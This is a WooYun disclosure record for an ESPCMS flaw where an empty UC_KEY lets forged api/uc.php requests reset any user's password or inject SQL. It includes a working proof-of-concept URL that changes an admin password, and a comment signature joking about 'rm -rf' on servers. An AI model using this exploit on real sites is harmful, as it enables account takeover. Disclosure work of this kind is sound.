{"id": 8033, "wybug_id": "wooyun-2013-035697", "wybug_title": "ESPCMS某接口文件存在缺陷可重置任意用户密码", "wybug_corp": "易思ESPCMS企业网站管理系统", "wybug_author": "viekst", "wybug_date": "2013-08-30 19:03", "wybug_open_date": "2013-11-25 19:04", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安全意识不足", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-08-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-09-04：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-10-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-11-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-11-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-11-25：\t细节向公众公开  简要描述： ESPCMS某接口文件存在缺陷可重置任意用户密码，还可造成SQL注入 详细说明：  /espcms_utf8_5.7.13.08.15_b/upload/api/uc.php该文件可能是用作 与ucenter做接口的，espcms在默认安装存在，第36行起\n...$_DCACHE = $get = $post = array();\t$code = @$_GET['code'];\tparse_str(_authcode($code, 'DECODE', UC_KEY), $get);\tif (MAGIC_QUOTES_GPC) {\t\t$get = _stripslashes($get);\t}...\ncode变量从get中获取后经过_authcode函数解密成字符串 接着解析到变量中，重点来到_authcode函数，这是一个经典的的流密码实现的算法,定义密匙通过抑或运算得到密文，很多开源CMS都有用到，ESPCMS的cookie也是用的该种加密\nfunction _authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {\t$ckey_length = 4;\t$key = md5($key ? $key : UC_KEY);\t$keya = md5(substr($key, 0, 16));\t$keyb = md5(substr($key, 16, 16));\t$keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length) : substr(md5(microtime()), -$ckey_length)) : '';\t$cryptkey = $keya . md5($keya . $keyc);\t$key_length = strlen($cryptkey);\t$string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0) . substr(md5($string . $keyb), 0, 16) . $string;\t$string_length = strlen($string);\t$result = '';\t$box = range(0, 255);\t$rndkey = array();\tfor ($i = 0; $i <= 255; $i++) {\t\t$rndkey[$i] = ord($cryptkey[$i % $key_length]);\t}\tfor ($j = $i = 0; $i < 256; $i++) {\t\t$j = ($j + $box[$i] + $rndkey[$i]) % 256;\t\t$tmp = $box[$i];\t\t$box[$i] = $box[$j];\t\t$box[$j] = $tmp;\t}\tfor ($a = $j = $i = 0; $i < $string_length; $i++) {\t\t$a = ($a + 1) % 256;\t\t$j = ($j + $box[$a]) % 256;\t\t$tmp = $box[$a];\t\t$box[$a] = $box[$j];\t\t$box[$j] = $tmp;\t\t$result.=chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));\t}\tif ($operation == 'DECODE') {\t\tif ((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16)) {\t\t\treturn substr($result, 26);\t\t} else {\t\t\treturn '';\t\t}\t} else {\t\treturn $keyc . str_replace('=', '', base64_encode($result));\t}}\n但是注意该处的密匙UC_KEY没有定义，也没有用到db_pscode，该处是空的，那么我们就可以通过_authcode算法自行加密了，接着往下看\n...include_once DISCUZ_ROOT2 . 'datacache/public.php';\t\trequire_once DISCUZ_ROOT . './class_dbMysql.php';\t\t$GLOBALS['db'] = new dbmysql();\t\t$GLOBALS['db']->connect(db_host, db_user, db_pw, db_name, db_charset, 1);\t\t$GLOBALS['tablepre'] = db_prefix;\t\t$uc_note = new uc_note();\t\t$turecode = $uc_note->$get['action']($get, $post);\t\texit($uc_note->$get['action']($get, $post));...\n到了这里我们就可以调用以下方法了，改密码，改用户，删用户什么的，\n'test', 'deleteuser', 'renameuser', 'gettag', 'synlogin', 'synlogout', 'updatepw', 'updatebadwords', 'updatehosts', 'updateapps', 'updateclient', 'updatecredit', 'getcreditsettings', 'updatecreditsettings'\n   漏洞证明：  \ncode = _authcode('action=updatepw&time=1477834492&username=admin888&password=1111111','ENCODE','')http://demo.ecisp.cn/api/uc.php?code=094epCszE0DZRnt2Pv34E8VkGrLYXsXizGVzdzeJIhXoTx7N8w%2bLG6zR0zWMwkUbhtyXrBEFXHctzJrLdiu6aaixIJYNH0%2bt9U%2byhpmQhvgwFM11ss9oe%2faJ2uc7KGQ   //将admin888用户密码改为1111111\n另外上面在进行数据库查询的时候未做任何过滤，还可引起SQL注入   修复方案：  没有用的就删除了..   版权声明：转载请注明来源 viekst@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2013-11-25 19:04 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-08-31 01:50 |    \t\t猪头子 \t\t\t( 普通白帽子  |\t\t\t        Rank:189 漏洞数:35        | 自信的看着队友rm -rf/tar挂服务器)\t\t \n  难道uc？    \n     2013-08-31 09:02 |    \t\tviekst \t\t\t( 实习白帽子  |\t\t\t        Rank:64 漏洞数:11        )\t\t \n  @猪头子 嗯,确实..    \n     2013-09-02 15:16 |    \t\t猪头子 \t\t\t( 普通白帽子  |\t\t\t        Rank:189 漏洞数:35        | 自信的看着队友rm -rf/tar挂服务器)\t\t \n  @viekst 我恨你    \n     2013-09-02 15:45 |    \t\tviekst \t\t\t( 实习白帽子  |\t\t\t        Rank:64 漏洞数:11        )\t\t \n  @猪头子 哥们咋了,我没招惹你啊.  唉,目测忽略..    \n     2013-09-02 21:35 |    \t\t猪头子 \t\t\t( 普通白帽子  |\t\t\t        Rank:189 漏洞数:35        | 自信的看着队友rm -rf/tar挂服务器)\t\t \n  @viekst 别生气我开玩笑的    \n     2013-11-25 19:24 |    \t\t麻花藤 \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:1        | ด้้้้้็็็็็้้้้้็็็็...)\t\t \n  @viekst 是异或运算，不是“抑或”，哈哈    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}